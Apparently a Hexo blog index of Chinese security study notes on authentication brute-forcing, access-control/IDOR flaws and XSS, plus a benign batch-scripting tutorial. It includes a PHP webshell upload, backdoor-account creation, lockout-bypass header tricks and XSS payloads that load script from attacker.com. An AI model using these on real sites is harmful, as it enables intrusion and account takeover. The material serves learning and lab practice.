{"meta":{"title":"Hexo","subtitle":"","description":"网络安全学习博客","author":"ziddzide","url":"http://ziddzide.io","root":"/"},"pages":[],"posts":[{"title":"身份验证","slug":"身份验证","date":"2025-09-27T06:25:08.000Z","updated":"2025-10-10T11:19:15.460Z","comments":true,"path":"2025/09/身份验证/","permalink":"http://ziddzide.io/2025/09/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/","excerpt":"","text":"身份验证漏洞文章靶场参考出处靶场及出处连接 验证与授权身份验证是验证用户是否为其所声称身份的过程。授权包括验证用户是否被允许执行某项操作。 例如,身份验证决定某人是否试图访问带有用户名的网站Carlos123创建该账户的人确实是同一个人。 一次Carlos123经过身份验证,其权限决定其授权执行的操作。例如,他们可能被授权访问其他用户的个人信息,或执行删除其他用户账户等操作。 简而言之认证:确定你是否是声称的用户验证: 根据权限表确定你拥有的权限 弱口令攻击是指攻击者使用试错系统来判断有效的用户凭据。这些攻击通常使用用户名和密码的字列表进行自动化。自动化此流程,尤其是使用专用工具,可能使攻击者能够高速进行大量登录尝试。 暴力胁迫并不总是只是对用户名和密码进行完全随机猜测的情形。通过使用基本逻辑或公开知识,攻击者可以微调暴力攻击,从而做出更明智的猜测。这大大提高了此类攻击的效率。依赖基于密码的登录作为唯一身份验证方式的网站,如果未能实施足够的防护,可能会极易受到攻击。 1例如利用brup suite配置用户名字典和密码字典暴力破解密码 用户名枚举登录页面 ​输入有效的用户名 + 错误的密码​ -&gt; 网站返回： ​​“密码错误”​。 ​输入无效的用户名 + 任意密码​ -&gt; 网站返回： ​​“用户名不存在”​。 注册页面这是您例子中提到的第二个场景。当尝试注册新账户时： ​输入一个未被占用的用户名​ -&gt; 网站返回： ​​“该用户名可用”​。 ​输入一个已被占用的用户名​ -&gt; 网站返回： ​​“该用户名已被注册”​。 密码重置功能 ​输入有效的用户名&#x2F;邮箱​ -&gt; 网站返回： ​​“重置密码链接已发送到您的邮箱”​。 ​输入无效的用户名&#x2F;邮箱​ -&gt; 网站返回： ​​“该用户不存在”​。 用户信息的暴露与收集浏览网站公开信息，收集已暴露的用户名 论坛帖子&#x2F;博客评论：​​ 发帖人、评论者的用户名通常会显示。如果网站允许用户使用自定义链接,example.com/user/张三 ​用户资料页面：​​ 即使资料内容（如邮箱、电话）被隐藏，但资料页面的URL或页面标题本身可能就包含了用户名。例如，访问 example.com/profile/carlos123 ​作者信息：​​ 新闻网站、博客文章下方常会标注“作者：admin”。 分析HTTP请求的返回数据包 ​目标：​​ 从网站服务器返回的数据包中，寻找前端页面不直接显示、但隐藏在代码里的敏感信息。 ​具体做法：​​ 使用 ​Burp Suite、浏览器开发者工具等拦截网站的各种HTTP响应。 ​检查什么：​​ 仔细查看响应报文（Response）的正文​ 和HTTP头。 ​可能泄露的信息：​​ ​注释掉的代码：​​ 开发人员有时会在HTML注释中临时写下信息，如 &lt;!-- 管理员邮箱：admin@company.com --&gt;。 ​隐藏的输入框：​​ value值可能包含当前登录用户的邮箱。 ​API响应：​​ 网站通过Ajax加载数据时，返回的JSON数据里可能包含用户信息（如邮箱、ID）。 ​HTTP头信息：​​ 某些服务器配置可能会在报头里泄露服务器管理员邮箱或内部用户名。 寻找高优先级用户：​​ 攻击者的目标是获得最大权限，因此他们会优先寻找管理员、系统维护人员等高级别用户的账号。在侦察阶段，他们会特别留意是否有这类用户的邮箱或用户名被泄露（例如，在错误信息或联系页面中出现的IT支持邮箱）。 admin或administrator。 基于密码的攻击方式与绕过手段响应时间的细微差别绕过根据brup suite暴力破解,有一些用户名或者是和密码的组合会在响应时间上有差别,这也是最基本弱口令和攻击的判断方式. 123在可行的情况下应该先判断用户名如库中查询到用户名继而会查询密码,如果没有会返回200所以要将密码设计成将近100个字符的长度,用于扩大响应时间的差距,继而再判断密码 绕过双重身份验证有时,双重身份验证的实现存在缺陷,以至于完全可以绕过它。 如果用户首次被提示输入密码,然后提示在单独的页面上输入验证码,则在输入验证码之前,该用户实际上处于“登录状态”状态。在这种情况下,值得测试一下,在完成第一个身份验证步骤后,是否可以直接跳转到“仅登录”页面。偶尔,你会发现网站在加载页面之前实际上并未检查是否完成了第二步。 12利用已知用户url直接绕过即可https://0ab600c70408d34281a2a22600d60020.web-security-academy.net/my-account?id=carlos 基于ip的防护有些网站可能会对ip进行检查,如果短时间内多次登陆失败会禁止访问 1234解决方案:在brup内抓包后给http添加X-Forwarded-For: 192.168.1.1的请求头对ip地址设计成1~1000的数值递增即可 有缺陷的防护常见方法: 锁定远程用户在进行过多失败登录时尝试访问的账户 如果远程用户连续进行过多登录尝试,将屏蔽其IP地址 解决方案: 使用基于Ip的破解方法 每过一段时间插入成功的用户刷新失败计数器 方法: 123添加X-Forwarded-For的http请求头,IP地址设计为随机数在用户名和密码字典中插入正确的用户名和密码不断刷新计数器在资源池中设置并发请求数为1 为什么要把并发数设计为1? 致命问题​： 服务器处理请求存在并行性和乱序性​ 当第x个请求（试探用户的最后一次机会的失败）先于第x+1个请求（用于刷新计数器的正常用户成功）被处理时 ​IP封锁机制立即激活，后续所有请求被拒绝 意思是假设采用原有的资源池设计,假如一次性处理十条请求的话,在这十条请求里面失败三次的请求率先被响应的话立刻封锁ip和账户,后续请求就会失败,这是完全有可能的事,并发请求的状态下,服务器处理用户名确定是否存在,如果存在继续核实用户名密码,而错误的用户名会被服务器检查完是否存在后返回状态码,理论上响应时间比正确用户要快,还有一些其他类似的情况,不过依照理论的响应时间来看,所以要把并发数设计为1. 而需要注意到的是这十条请求并非同时进行,由于服务器处理并发请求时存在*线程调度随机性*,并不能直接确定是哪一条请求被率先执行","categories":[],"tags":[]},{"title":"访问控制漏洞","slug":"访问控制漏洞","date":"2025-09-26T18:03:34.000Z","updated":"2025-10-10T11:19:15.458Z","comments":true,"path":"2025/09/访问控制漏洞/","permalink":"http://ziddzide.io/2025/09/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"访问控制漏洞定义访问控制是指对谁或哪些人被授权执行操作或访问资源的限制。在Web应用程序的上下文中,访问控制依赖于身份验证和会话管理: Authentication认证确认用户即称自己是谁。 Session management会话管理识别同一用户随后发出的HTTP请求。 Access control访问控制决定用户是否被允许执行他们试图执行的操作。 访问控制中断很常见,且通常存在严重的安全漏洞。访问控制的设计与管理是一个复杂而动态的问题,它将业务、组织和法律约束应用于技术实施。访问控制设计决策必须由人类做出,因此出错的可能性很高。 定义及后续漏洞所参考的原出处 垂直越权定义普通用户获取到管理员权限 操作无保护功能在最基本的情况下,当应用程序对敏感功能不执行任何保护时,就会出现垂直权限的升级。例如,管理功能可能从管理员的欢迎页面链接,但不能从用户的欢迎页面链接。然而,用户可以通过浏览相关管理网址来访问管理功能。 例如,一个网站可能以以下网址托管敏感功能: https://insecure-website.com/admin 任何用户都可以访问此功能,而不仅仅是在用户界面中具有该功能链接的管理员用户。在某些情况下,管理网址可能会在其他地点被披露,例如robots.txt文件: https://insecure-website.com/robots.txt 即使网址未在任何地方被披露,攻击者也可能能够使用文字列表来暴力控制敏感功能的位置。 文字列表的暴力破解前提准备-&gt;专门应对的字典下面是一些常用的字典的数据 1234567891011121314/admin/administrator/manager/console/backoffice/cpanel/controlpanel/dashboard/login/sysadmin/root/secret/internal/legacy FFUF工具的使用123456789# 基础探测（过滤403/404）ffuf -w admin_paths.txt -u https://target.com/FUZZ \\ -fc 403,404 \\ -t 50# 高级参数（带扩展名探测）ffuf -w admin_paths.txt -u https://target.com/FUZZ.php \\ -mc 200,302 \\ -H &quot;X-Forwarded-For: 127.0.0.1&quot; brup suite配置1234567891. 发送任意GET请求到Intruder2. 设置攻击类型：**Sniper**3. 攻击位置：路径末尾 `GET /FUZZ HTTP/1.1`4. Payload类型：**Simple list**5. 加载字典文件6. 添加Grep Match规则： - `Location: admin` - `Admin Panel` - `name=&quot;admin_password&quot;` 关注点 响应特征 可能的管理后台 302重定向 &#x2F;admin&#x2F;login 登录表单 &lt;input type=&quot;password 特殊Cookie admin_session=... 框架特征 Powered by Drupal 无保护功能 - 持续在某些情况下,通过提供一个不太可预测的网址来隐藏敏感功能。这是所谓“默默无闻的安全”的一个例子。然而,隐藏敏感功能并不能提供有效的访问控制,因为用户可能会通过多种方式发现混淆的网址。 设想一个在以下 URL 下托管管理函数的应用程序: https://insecure-website.com/administrator-panel-yb556 攻击者可能不会直接猜到这一点。然而,该应用程序仍可能将网址泄露给用户。该网址可能在 JavaScript 中披露,该界面根据用户的角色构建用户界面: 12345&lt;script&gt; var isAdmin = false; if (isAdmin) &#123; ... var adminPanelTag = document.createElement(&#x27;a&#x27;); adminPanelTag.setAttribute(&#x27;href&#x27;, &#x27;https://insecure-website.com/administrator-panel-yb556&#x27;); adminPanelTag.innerText = &#x27;Admin panel&#x27;; ... &#125; &lt;/script&gt; 如果用户是管理员,此脚本会添加指向用户用户界面的链接。然而,包含该URL的脚本对所有用户都可见,无论其角色如何。 案例1234567891011var isAdmin = false;if (isAdmin) &#123; var topLinksTag = document.getElementsByClassName(&quot;top-links&quot;)[0]; var adminPanelTag = document.createElement(&#x27;a&#x27;); adminPanelTag.setAttribute(&#x27;href&#x27;, &#x27;/admin-av8xy4&#x27;); adminPanelTag.innerText = &#x27;Admin panel&#x27;; topLinksTag.append(adminPanelTag); var pTag = document.createElement(&#x27;p&#x27;); pTag.innerText = &#x27;|&#x27;; topLinksTag.appendChild(pTag);&#125; 解释: 12345678910111213141516声明一个变量isAdmin，并设置为false。如果isAdmin为true，则执行以下操作：a. 获取类名为&quot;top-links&quot;的第一个元素（假设这是一个容器，用于放置顶部链接）。b. 创建一个新的&lt;a&gt;元素（管理员面板链接）。c. 设置这个链接的href属性为&quot;/admin-av8xy4&quot;（这是一个特定的管理员面板路径）。d. 设置链接的文本为&quot;Admin panel&quot;。e. 将这个链接添加到topLinksTag元素的末尾。f. 创建一个&lt;p&gt;元素，用于显示一个竖线分隔符（|）。g. 将这个分隔符也添加到topLinksTag元素的末尾。 虽然管理员页面的路径是复杂的字符串,可是校验的script代码暴露了管理员页面的路径 基于参数的访问控制方法一些应用程序会确定用户在登录时的访问权限或角色,然后将此信息存储在用户可控制的位置。这可能是: 一个隐藏的领域。 cooike。 预设查询字符串参数。 申请根据所提交的价值做出访问控制决策。例如: https://insecure-website.com/login/home.jsp?admin=true https://insecure-website.com/login/home.jsp?role=1 这种方法缺乏安全感,因为用户可以修改他们未经授权的值和访问功能,例如管理功能。 brup suite配置12345由于是通过参数方式检验管理员权限例如:admin=true此时可以修改报文中的admin=false为admin=true进行越权要注意的是,管理员的每一个操作都会检验权限,所以每一步在brup suite配置下抓包进行 入侵步骤用Burp Suite拦截请求，查找以下特征参数：1234567891011GET /dashboard HTTP/1.1Cookie: role=user; admin=false...POST /update_profile HTTP/1.1...admin=0&amp;privilege=1&lt;!-- 隐藏表单 --&gt;&lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;0&quot;&gt; ​重点关注这些关键词​： admin, role, access_level privilege, is_staff, is_superuser auth, authorized, permission 参数篡改测试 参数类型 原始值 测试值 预期效果 ​布尔型​ admin=false admin=true 开启管理员功能 ​数字型​ role=1 role=0或role=9 切换权限等级 ​字符型​ type=user type=admin 提升权限组 ​二进制​ access=0001 access=1111 开启所有权限 绕过技巧​参数污染​： 123?role=user&amp;role=admin ​JSON劫持​： 12345&#123;&quot;user&quot;:&quot;normal&quot;, &quot;isAdmin&quot;:false&#125;改为→&#123;&quot;user&quot;:&quot;normal&quot;, &quot;isAdmin&quot;:true&#125; ​数据类型转换​： 12345admin=1 # 原始admin=on # 测试admin=yes ​空值绕过​： 1234privilege= # 空值role=undefined 水平越权和权限提升 如果用户能够访问属于其他用户的资源,而非他们自己的此类资源,就会发生横向权限升级。例如,如果员工可以访问其他员工以及他们自己的记录,那么这就是横向权限的升级。 水平权限升级攻击可能使用类似类型的利用方式来实现垂直权限升级。例如,用户可能会使用以下网址访问自己的账户页面: 1https://insecure-website.com/myaccount?id=123 如果攻击者修改id对其他用户而言,参数值可能会访问其他用户的账户页面以及相关数据和功能。 注意在某些应用程序中,可利用的参数没有可预测的值。例如,应用程序可能使用全局唯一标识符(GUID)来识别用户,而不是增加数量。这可能会阻止攻击者猜测或预测其他用户的标识符。然而,在用户被引用的应用程序(如用户消息或评论)中,可能会披露属于其他用户的GUID。 简而言之-漏洞原理​直接对象引用​：系统使用暴露的标识符（如用户ID）定位资源​缺乏权限验证​：未检查请求者是否拥有该资源的访问权限 基础案例&#x2F;操作123GUID1.可以访问目标用户的资源通过抓包查看是否携带用户的id2.登录自己的账号,抓包查看报文中id字段,修改为目标用户即可 但这是没有任何防护的靶场,检测是否有防护如下文 检测方法12345678# 当ID为不可预测的GUID时：# 方法1：收集泄露的GUID（评论区/消息系统）# 方法2：测试可遍历性（即使GUID也应验证权限）GET /documents?id=7e4efc5b-8d1a-41a3-a8d7-720b216e7319# 检测响应：# - 200 OK + 他人数据 → 漏洞存在# - 403 Forbidden → 有基础防护 如果有403代表防护 权限提升通常,横向权限升级攻击可以通过牺牲更优越的用户来转变为垂直权限升级。例如,横向升级可能允许攻击者重置或捕获属于其他用户的密码。如果攻击者针对管理员用户并入侵其账户,则他们可以获取管理权限,从而执行垂直权限升级。 攻击者可能能够使用已描述的参数篡改技术访问其他用户的账户页面,以实现横向权限升级: https://insecure-website.com/myaccount?id=456 如果目标用户是应用程序管理员,则攻击者将访问管理账户页面。本页面可能会披露管理员的密码,或提供更改密码的手段,或直接提供对特权功能的访问权限。 案例-用户ID通过请求参数进行密码泄露用户登录抓包-&gt;修改id=administrator-&gt;查看预输入的密码(查看源代码)-&gt;登录管理员账户 !!!administrator:没有人会想到该死的id用13个字符. 操作发现IDOR漏洞123456789登录你的普通账户（如用户ID=100）用Burp Suite捕获查看个人资料的请求： GET /profile?id=100 HTTP/1.1 Cookie: session=your_cookie修改ID值发送给其他用户（如ID=101）： - GET /profile?id=100 + GET /profile?id=101 如果返回他人资料 → ​存在水平越权！​ 寻找管理员账户方法 –​ID递增扫描​ 用Burp Intruder批量测试ID范围（如1-1000） –​关键词搜索​ 在页面源码搜索 admin、root、superuser –​密码重置功能​ 尝试重置用户密码，观察返回邮箱后缀（如 admin@company.com） ​–员工名单泄露​ 检查 &#x2F;team.html、&#x2F;aboutus.html等页面 突破管理员账户方法1：窃取密码 访问管理员资料页：/profile?id=admin_id 查找页面中的敏感信息： 12345&lt;!-- 可能泄露的内容 --&gt;&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;Admin123!&quot;&gt; &lt;div class=&quot;email&quot;&gt;admin@company.com&lt;/div&gt; &lt;a href=&quot;reset_password?token=7aF3...&quot;&gt;忘记密码?&lt;/a&gt; 方法2：篡改密码重置 捕获普通用户的重置请求 修改为管理员ID重放： 12- user=100+ user=admin_id 方法3：会话劫持 在管理员资料页查找会话信息： 12345678// 可能泄露的JS代码var userSession = &#123; id: &quot;admin_id&quot;, token: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;, role: &quot;admin&quot; &#125; 复制会话值 → 用浏览器插件（如EditThisCookie）替换自己的Cookie 登录管理员账户 直接使用窃取的密码登录 或使用会话令牌访问： 12GET /admin_dashboard HTTP/1.1Cookie: session=stolen_admin_token 执行垂直提权操作12345671. 创建后门账户：POST /admin/create_user HTTP/1.1 username=backdoor&amp;password=hacked&amp;role=superadmin2. 部署WebShell： POST /admin/upload HTTP/1.1 file=&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;3. 窃取数据库：GET /admin/export_db HTTP/1.1 防御方案123456789101112131415// 安全代码示例：双重验证public void accessProfile(String userId) &#123; // 1. 从会话获取真实用户ID String realUserId = getCurrentUser(); // 2. 验证请求者身份 if (!realUserId.equals(userId)) &#123; throw new AccessDeniedException(); &#125; // 3. 敏感操作二次验证 if (action.equals(&quot;resetPassword&quot;)) &#123; require2FA(); // 强制双因素认证 &#125;&#125;","categories":[],"tags":[]},{"title":"XSS漏洞","slug":"XSS漏洞","date":"2025-09-24T12:10:55.000Z","updated":"2025-10-10T11:19:15.447Z","comments":true,"path":"2025/09/XSS漏洞/","permalink":"http://ziddzide.io/2025/09/XSS%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"XSS漏洞漏洞类型反射型&#x2F;存储型XSS 反射型XSS：恶意代码未被服务器存储，利用get&#x2F;post方式提交恶意代码，一次性触发 存储型XSS：恶意代码被服务器存储，访问页面时触发 DOM型XSS页面中JavaScript代码执行后被注入了污染的变量 利用方式1.XSS标签所有标签基本上都可以使用on事件触发恶意代码 12&lt;h1 onmousemove=&quot;alert(&quot;moved&quot;)&quot;&gt;this is a title&lt;/h1&gt;&lt;img src=x onerror=&quot;alert(&#x27;error&#x27;)&quot;/&gt; # 不存在x的图片报错 有一种最基础的标签,是XSS的象征: 1&lt;script&gt;alert(&#x27;error&#x27;)&lt;/script&gt; 还有一些其他类型的标签: 12345&lt;script src=&quot;https://attacker.com/a.js&quot;&gt;&lt;/script&gt;&lt;svg/onload=alert(&#x27;error&#x27;)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;&lt;link rel=&quot;import&quot; href=&quot;https://attacker.com/a.js&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; 2.HTML5特性的XSS1&lt;input onfocus=write(1) autofocus&gt; 利用javascript行内式编写： 1onclick=&#x27;alert(document.cooike) 连接后变为： 1&lt;input type=&#x27;text&#x27; name=&#x27;name&#x27; id=&#x27;id&#x27; value=&#x27;&#x27;onclick=&#x27;alert(document.cooike)’&gt; 3.伪协议1&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt; iframe和form也支持伪协议,但from只有提交表单时才会触发 12&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&lt;form action=&quot;javascript:alert(1)&quot;&gt;&lt;/form&gt; 而iframe不仅能实现JavaScript的伪协议,还有data等 12&lt;iframe src=&quot;data://text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;# &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 4.二次渲染XSS略 过滤和绕过4.payloads绕过速查 绕过 描述 结合js的html标签 &lt;img οnmοuseοver=&quot;alert(&#39;xxs&#39;)&quot;&gt; &lt;img src=xss οnerrοr=&quot;alert(1)&quot;&gt; 伪协议 &lt;a href=javascript:alert()&gt;xss&lt;/a&gt;&gt; 大小写绕过 &lt;scRipt&gt;alert(“XSS”)&lt;/scRipt&gt; 双写绕过 &lt;scrscriptipt&gt;alert(“XSS”);&lt;/scrscriptipt&gt; html编码绕过 — 标签优先级绕过 &lt;noscript&gt;&lt;img src=&quot;asdasd&lt;/noscript&gt;&lt;img src=* οnerrοr=prompt(1)&gt;&quot;&gt;&lt;/noscript&gt;","categories":[],"tags":[]},{"title":"batch基础学习指南","slug":"batch基础学习指南","date":"2025-09-24T07:20:39.000Z","updated":"2025-10-10T11:19:15.450Z","comments":true,"path":"2025/09/batch基础学习指南/","permalink":"http://ziddzide.io/2025/09/batch%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/","excerpt":"","text":"批处理命令文件的编写和利用引言我在启动三角洲行动时遇见了cpu虚拟化相关报错，有进程或是应用占用了虚拟化，我之前一直使用的是VMware，随用随关，但是我将虚拟机搭载到windows支持的wsl2后由于使用了Hper-V服务占用了虚拟化导致三角洲行动不断报错，查看ace网页后要关闭Hper-V服务重启后才可以进入，但是我觉得相当繁琐，要关闭服务还要关闭内核隔离中的内存完整性，因此想要制作批处理脚本自动化执行命令，简化我之后的重复劳动。既然如此，那就做一篇有关于bat的markdown文件记录，顺手作为教程。 bat基本语法命令基本命令注释符12:: 这一行都是注释REM 这一行也都是注释 回显12345678echo &quot;hello world&quot;::命令行界面输出hello world@echo [on|off]::打开|关闭回显chcp 65001::修改文档编码为utf-8,用于防止回显乱码echo %str%::输出字符串变量str的值 暂停12pause::输出&quot;请按任意键继续&quot; 设置变量123456set /a n=0REM 设置数字变量n=0set str=&quot;hello&quot;REM 设置字符串变量set arr=1 2 3 4 5::设置数组变量 字符串操作12345678set res=%str1% %str2%REM 连接字符串set str=%str1:~0,3%::字符串截取,从第0位开始截取三个字符echo %str:~3,5%::输出第三位开始共五个字符,用于查找%str:abc=xyz%::用于将字符串中abc替换为xyz 获取程序返回码12echo %errorlevel%::判断上一条命令是否成功,默认情况输出0 更改CMD标题,以及背景颜色123title &quot;三角洲行动bat文件&quot;color 02::作用不大,不做介绍 逻辑运算条件判断12345678if [not] 条件 命令::当条件为真[假]时执行命令equ &quot;=&quot;neq &quot;!=&quot;lss &quot;&lt;&quot;leq &quot;&lt;=&quot;gtr &quot;&gt;&quot;geq &quot;&gt;=&quot; 标签跳跃1234:标签名......if %var% leq 3 GOTO start::当var&lt;=3时执行标签符goto,跳转到start的地方向下继续执行 循环12345678910111213141516171819202122232425262728293031323334353637383940for的作用：在Bat脚本中用于执行循环和遍历操作。它可以遍历文件、文件夹、字符串列表等，并对每个元素执行一组命令。语法如下：for %parameter in (set) do command补充说明：%%parameter是一个可以替代的循环变量，可以使用任意名称，在bat的for中使用。%parameter这个关键字不能在bat中使用，只能在CMD命令下的for中使用。in和do之间括号不能省略，之间的(set) 表示指定要遍历的元素集合的表达式，其可以是文件名、文件夹路径、字符串列表或一些其他的表达式，变量可以是一个，也可以是多个，每一个字符串或变量，我们称之为一个元素，每个元素之间，用空格键、跳格键、逗号、分号或等号分隔；for /f ::遍历指定目录下所有的文件和文件夹for /d ::遍历指定目录下所有的文件夹for /r ::遍历指定目录下所有的文件和子文件夹中的文件::遍历文件夹中的文件for %%f in (D:\\path\\to\\folder\\*) do ( echo %%f REM 在此处执行其他命令)::* 是要遍历的文件夹路径和通配符，%%f 是循环变量::遍历文件内容行for /F &quot;delims=&quot; %%l in (file.txt) do ( echo %%l REM 在此处执行其他命令)::(file.txt) 是要遍历的文件，%%l 是循环变量，遍历文件的每一行，并在每次循环中执行一组命令。::/F选项指示 For 命令读取文件内容而不是文件名。::遍历字符串列表for %%s in (apple orange banana) do (echo %%sREM 在此处执行其他命令 )::apple orange banana是要遍历的字符串列表，%%s是循环变量，遍历列表中的每个元素此元素引用自csdn 处理命令调用外部程序1234567891011start 程序 [参数]/D::指定起始目录/MIN[MAX]::最小化[最大化]启动窗口/WAIT::程序结束后再执行脚本/B::在同一窗口执行程序/b::隐藏控制台执行程序 调用其他batch文件1234call batch文件---call script.bat 文本文件显示1234type text.txt---type 文件名 | find &quot;关键字&quot;::查找文件中的关键字 变量延迟赋值这个其实可以不用知道,唯一要确定的就是命令要单独一行,不要一行中出现两条命令 特殊符号命令12@::关闭当前行的回显 1234&gt;---echo hello&gt;test.txt::将test文件的内容替换为hello 1234&gt;&gt;::在文件末尾追加字符串---echo hello&gt;&gt;test.txt 123^---::转义字符,但只用于&lt; &gt; 回车符 12&amp;&amp;::命令连接符,不论前面的命令有没有出错都执行下一个指令 12&amp;::失败就不向后执行了 12||::成功就不执行了 更高的阶梯检测管理员权限1234567891011121314:: 方法1：NET SESSION检测法（推荐）net session &gt;nul 2&gt;&amp;1if %errorLevel% neq 0 ( echo 请右键以管理员身份运行！ timeout /t 3 exit ):: 方法2：FLTMC检测法fltmc &gt;nul 2&gt;&amp;1 || ( echo 需要管理员权限！ pause exit) 首先,net session是只有管理员权限才可以进行的操作,网络会话查看 &gt;重定向符,把net session的标准输出stdout定向到一个空设备,意味着丢弃 1表示标准输出,2表示错误输出,这是把错误输出定向到标准输出里,但是标准输出被定向到空设备丢弃,所以错误输出也会被丢弃. 之所以很复杂是因为,net session如果执行失败,它不会有标准输出,会有报错,也就是错误输出,此时按照原理丢弃 如果执行成功,会输出标准输,没有错误输出,会被丢弃,这会是一种没有任何输出的安静的检验管理员权限的办法 %errorlevel%捕获了上行的返回码,用于逻辑判断 更深的路 基本的操作和检测管理员权限已经讲清，剩余的是有关于dism高级命令等一系列命令脚本，会慢更新。 兼容性在我使用deepseek创建脚本时出现报错,batch作为Windows的胶水语言随版本更新总会出现一些意想不到的结果,但这并不是batch的错,所以出现兼容性问题时先查看命令或者特性有没有被新版本删除 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122@echo offsetlocal enabledelayedexpansion:: ===== 修复：移除有问题的Unicode检测代码 =====:: 只保留必要的编码设置chcp 65001 &gt;nultitle Batch 脚本教学工具 - 修复版:: ===== 添加暂停以确保窗口保持打开 =====echo 正在初始化...timeout /t 1 &gt;nul:: ===== 简化的主菜单 =====:MENUclsecho.echo ================================echo Batch 脚本教学工具echo ================================echo [1] 显示系统信息echo [2] 文件操作演示echo [3] 网络测试echo [4] 退出echo ================================:: 使用更稳定的选择方式set /p choice=请选择功能 (1-4): if &quot;%choice%&quot;==&quot;1&quot; goto INFOif &quot;%choice%&quot;==&quot;2&quot; goto FILESif &quot;%choice%&quot;==&quot;3&quot; goto NETWORKif &quot;%choice%&quot;==&quot;4&quot; exitecho 输入无效，请重新选择pausegoto MENU:INFOclsecho.echo ===== 系统信息 =====echo.:: 使用更兼容的命令获取系统信息echo 操作系统信息:systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;系统类型&quot;echo.echo 计算机名称: %COMPUTERNAME%echo 用户名: %USERNAME%echo.echo 磁盘空间信息:for /f &quot;skip=1&quot; %%d in (&#x27;wmic logicaldisk get caption,size,freespace&#x27;) do ( if not &quot;%%d&quot;==&quot;&quot; echo 驱动器 %%d)echo.pausegoto MENU:FILESclsecho.echo ===== 文件操作演示 =====echo.:: 显示当前目录文件echo 当前目录文件列表:dir /Becho.:: 创建示例文件进行演示echo 正在创建示例文件...echo 这是示例文件1 &gt; sample1.txtecho 这是示例文件2 &gt; sample2.txtecho 这是示例文件3 &gt; sample3.txtecho 创建完成！新文件列表:dir /B *.txtecho.:: 批量重命名演示set /a count=0for %%f in (*.txt) do ( set /a count+=1 ren &quot;%%f&quot; &quot;renamed_file_!count!.txt&quot;)echo 重命名后文件列表:dir /B *.txtecho.:: 清理示例文件del *_file_*.txtecho 已清理示例文件pausegoto MENU:NETWORKclsecho.echo ===== 网络测试 =====echo.echo 网络适配器信息:ipconfig | findstr IPv4echo.set /p host=请输入要测试的网址或IP(直接回车使用百度): if &quot;%host%&quot;==&quot;&quot; set host=www.baidu.comecho 正在ping测试...ping -n 3 %host%echo.echo 网络测试完成pausegoto MENU 结果报错 1234&#x27;wmic&#x27; is not recognized as an internal or external command,operable program or batch file 遇到的问题是因为在 Windows 11 22H2 及更高版本中，微软已弃用并移除了 WMIC 工具。让我提供一个完全兼容的修复版脚本，使用替代命令获取系统信息 修改后: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124@echo offsetlocal enabledelayedexpansionchcp 65001 &gt;nultitle Batch 脚本教学工具 - 兼容版:: ===== 主菜单 =====:MENUclsecho.echo ================================echo Batch 脚本教学工具echo ================================echo [1] 显示系统信息echo [2] 文件操作演示echo [3] 网络测试echo [4] 退出echo ================================set /p choice=请选择功能 (1-4): if &quot;%choice%&quot;==&quot;1&quot; goto INFOif &quot;%choice%&quot;==&quot;2&quot; goto FILESif &quot;%choice%&quot;==&quot;3&quot; goto NETWORKif &quot;%choice%&quot;==&quot;4&quot; exitecho 输入无效，请重新选择pausegoto MENU:: ===== 系统信息 (不使用WMIC) =====:INFOclsecho.echo ===== 系统信息 =====echo.:: 使用systeminfo获取基本信息echo 操作系统信息:systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;系统类型&quot;echo.echo 计算机名称: %COMPUTERNAME%echo 用户名: %USERNAME%echo.:: 使用powershell获取磁盘信息echo 磁盘空间信息:echo.for /f &quot;tokens=1,2,3&quot; %%a in (&#x27;powershell &quot;Get-CimInstance -ClassName Win32_LogicalDisk | Format-List DeviceID, Size, FreeSpace&quot; ^| findstr /v &quot;:&quot;&#x27;) do ( set &quot;drive=%%a&quot; set &quot;size=%%b&quot; set &quot;free=%%c&quot; :: 转换为GB set /a size_gb=!size!/1073741824 set /a free_gb=!free!/1073741824 echo 驱动器 !drive! - 总空间: !size_gb! GB, 可用空间: !free_gb! GB)echo.pausegoto MENU:: ===== 文件操作演示 =====:FILESclsecho.echo ===== 文件操作演示 =====echo.:: 显示当前目录文件echo 当前目录文件列表:dir /Becho.:: 创建示例文件进行演示echo 正在创建示例文件...echo 这是示例文件1 &gt; sample1.txtecho 这是示例文件2 &gt; sample2.txtecho 这是示例文件3 &gt; sample3.txtecho 创建完成！新文件列表:dir /B *.txtecho.:: 批量重命名演示set /a count=0for %%f in (*.txt) do ( set /a count+=1 ren &quot;%%f&quot; &quot;renamed_file_!count!.txt&quot;)echo 重命名后文件列表:dir /B *.txtecho.:: 清理示例文件del *_file_*.txtecho 已清理示例文件pausegoto MENU:: ===== 网络测试 =====:NETWORKclsecho.echo ===== 网络测试 =====echo.echo 网络适配器信息:ipconfig | findstr IPv4echo.set /p host=请输入要测试的网址或IP(直接回车使用百度): if &quot;%host%&quot;==&quot;&quot; set host=www.baidu.comecho 正在ping测试...ping -n 3 %host%echo.echo 网络测试完成pausegoto MENU 